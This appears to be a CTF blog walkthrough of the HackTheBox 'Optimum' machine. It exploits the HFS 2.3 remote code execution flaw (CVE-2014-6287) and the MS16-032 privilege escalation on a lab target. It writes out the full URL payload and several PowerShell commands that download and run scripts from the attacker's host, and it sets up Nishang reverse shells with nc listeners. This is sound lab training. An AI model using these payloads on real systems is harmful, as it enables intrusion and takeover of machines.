---
title: "Walk-through of Optimum from HackTheBox"
header: 
  teaser: /assets/images/2020-06-29-21-57-18.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - HTB
  - CTF
  - 
  - 
  - Windows
---

## Machine Information

![Optimum](/assets/images/2020-06-29-21-57-18.png)

Optimum is rated easy and mainly focuses on enumeration of services with known exploits. There are Metasploit modules for the exploits, making this box relatively easy to complete. To make it more interesting I have chosen to complete it via other means. Skills required are basic knowledge of Windows, and enumerating ports and services. Skills learned are identifying vulnerable services and using basic Windows privilege escalation techniques.

<!--more-->

| Details |  |
| --- | --- |
| Hosting Site | [HackTheBox](https://www.hackthebox.eu/) |
| Link To Machine | [HTB - 006 - Easy - Optimum](https://www.hackthebox.eu/home/machines/profile/6) |
| Machine Release Date | 18th March 2017 |
| Date I Completed It | 23rd July 2019 |
| Distribution used | Kali 2019.1 – [Release Info](https://www.kali.org/news/kali-linux-2019-1-release/) |

## Initial Recon

As always, start with Nmap:

```text
root@kali:~/htb/optimumh# ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.8 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
root@kali:~/htb/optimum# nmap -p$ports -sC -sV -oA optimum 10.10.10.8
Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-23 22:09 BST
/Nmap scan report for 10.10.10.8
Host is up (0.038s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Only has port 80 open, try it in browser:

![httpfileserver](/assets/images/2020-06-29-22-04-24.png)

Has a login page, but no obvious way in. Is running HTTPFileServer 2.3, Google it to find an exploit [here](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6287) that says:

```text
The findMacroMarker function in parserLib.pas in Rejetto HTTP File Server (aks HFS or HttpFileServer) 2.3x before 2.3c allows remote attackers to execute arbitrary programs via a %00 sequence in a search action.
```

This explains that we can execute our own commands after %00 passed via the URL.

## Gaining Access

Open another terminal and set tcpdump listening:

```text
root@kali:~/htb/optimumh# tcpdump -i tun0
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
```

Open Burp and use Repeater to test:

![burp_ping](/assets/images/2020-06-29-22-07-22.png)

Clicking go should ping me:

```text
22:33:43.401625 IP kali.39206 > 10.10.10.8.http: Flags [.], ack 1744, win 276, options [nop,nop,TS val 2785576152 ecr 720506], length 0
22:33:43.402242 IP kali.39206 > 10.10.10.8.http: Flags [F.], seq 406, ack 1744, win 276, options [nop,nop,TS val 2785576153 ecr 720506], length 0
22:33:43.440371 IP 10.10.10.8.http > kali.39206: Flags [.], ack 407, win 257, options [nop,nop,TS val 720511 ecr 2785576153], length 0
```

So this proves I can execute a ping command through the search field of the webpage. I can use this to get a shell, get a PowerShell reverse one from [Nishang:](https://github.com/samratashok/nishang)

```text
root@kali:~/htb/optimumh# git clone https://github.com/samratashok/nishang.git
Cloning into 'nishang'...
remote: Enumerating objects: 16, done.
remote: Counting objects: 100% (16/16), done.
remote: Compressing objects: 100% (13/13), done.
remote: Total 1676 (delta 5), reused 12 (delta 3), pack-reused 1660
Receiving objects: 100% (1676/1676), 7.76 MiB | 1.93 MiB/s, done.
Resolving deltas: 100% (1045/1045), done.
```

Use the Invoke-PowerShellTcp.ps1 script for the reverse shell, first put this at the end of the file:

```text
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.22 -Port 1337
```

That's my IP and port I want to connect to. Open another terminal and start an HTTP Server:

```text
root@kali:~/htb/optimumh# python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
```

Open another terminal and start a nc listening session, ready to connect to:

```text
nc -lvnp 1337
listening on [any] 1337 ...
```

## Initial Shell

Go back to Burp Repeater and change command to this:

```text
GET /?search=%00{.exec|c:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX(New-Object Net.WebClient).downloadString('http://10.10.14.22:8000/Invoke-PowerShellTcp.ps1').}
```

Then hit ctrl-u to URL encode it:

```text
/?search=%00{.exec|c%3a\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe+IEX(New-Object+Net.WebClient).downloadString('http%3a//10.10.14.22%3a8000/Invoke-PowerShellTcp.ps1').} HTTP/1.1
```

Now press Go on Burp then switch to HTTP server, should have a connection:

```text
10.10.10.8 - - [23/Jul/2019 22:39:30] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -
```

Switch to nc and should have a shell connected:

```text
connect to [10.10.14.22] from (UNKNOWN) [10.10.10.8] 49162
Windows PowerShell running as user kostas on OPTIMUM
Copyright (C) 2015 Microsoft Corporation. All rights reserved.
PS C:\Users\kostas\Desktop> whoami
optimum\kostas
PS C:\Users\kostas\Desktop>systeminfo 
Host Name:                 OPTIMUM
OS Name:                   Microsoft Windows Server 2012 R2 Standard
OS Version:                6.3.9600 N/A Build 9600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
```

## Privilege Escalation

To check for vulnerabilities we can get [this](https://github.com/rasta-mouse/Sherlock) PowerShell script, to quickly find missing software patches for local privilege escalation vulnerabilities.

Switch to a new terminal:

```text
root@kali:~/htb/optimumh# git clone https://github.com/rasta-mouse/Sherlock.git
Cloning into 'Sherlock'...
remote: Enumerating objects: 75, done.
remote: Total 75 (delta 0), reused 0 (delta 0), pack-reused 75
Unpacking objects: 100% (75/75), done.
```

In the Sherlock.ps1 script there's a function called Find-AllVulns, add this to the end of the script to get it to run when we execute.

Start a webserver on Kali, then switch back to my NC shell already connected to the box, and pull the script across:

```text
PS C:\Users\kostas\Desktop> IEX(New-Object Net.Webclient).downloadString('http://10.10.14.22:8000/Sherlock.ps1')
```

This will run the script to check, has lots of possibilities, but go with this one:

```text
Title      : Secondary Logon Handle
MSBulletin : MS16-032
CVEID      : 2016-0099
Link       : https://www.exploit-db.com/exploits/39719/
VulnStatus : Appears Vulnerable
```

Empire has a prebuilt module for this vulnerability, so get the whole project:

```text
root@kali:~/htb/optimumh# git clone https://github.com/EmpireProject/Empire.git
Cloning into 'Empire'...
remote: Enumerating objects: 12213, done.
remote: Total 12213 (delta 0), reused 0 (delta 0), pack-reused 12213
Receiving objects: 100% (12213/12213), 21.96 MiB | 3.01 MiB/s, done.
```

Add this to the end of the Invoke-MS16032 script, so it pulls a shell from my Kali:

```text
Invoke-MS16032 -Command "iex(New-Object Net.WebClient).DownloadString('http://10.10.14.22:8000/shell.ps1')"
```

Now make a copy my existing Invoke-PowerShellTCP.ps1 script so I can use it again, whilst first one is still being used:

```text
root@kali:~/htb/optimumh# cp Invoke-PowerShellTcp.ps1 shell.ps1
root@kali:~/htb/optimumh# nano shell.ps1
```

Change the last line to this:

```text
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.22 -Port 1338
```

Switch to a new terminal and start another NC listener:

```text
root@kali:~/htb/optimumh# nc –lvnp 1338
```

## User And Root Flags

Finally switch back to my existing shell on the box, download and run the exploit from my HTTP server:

![invoke-ms16032](/assets/images/2020-06-29-22-08-19.png)

Once the privilege escalation exploit runs it then connects to my other nc listener as root:

![nc_listener](/assets/images/2020-06-29-22-08-36.png)

Using TMUX, it looks like this:

![tmux_layout](/assets/images/2020-06-29-22-08-59.png)

I can now get both of the flags:

```text
PS C:\Users\kostas\Desktop> cat C:\Users\kostas\Desktop\user.txt.txt
<<HIDDEN>>
PS C:\Users\kostas\Desktop> cat C:\Users\Administrator\Desktop\root.txt
<<HIDDEN>>
```
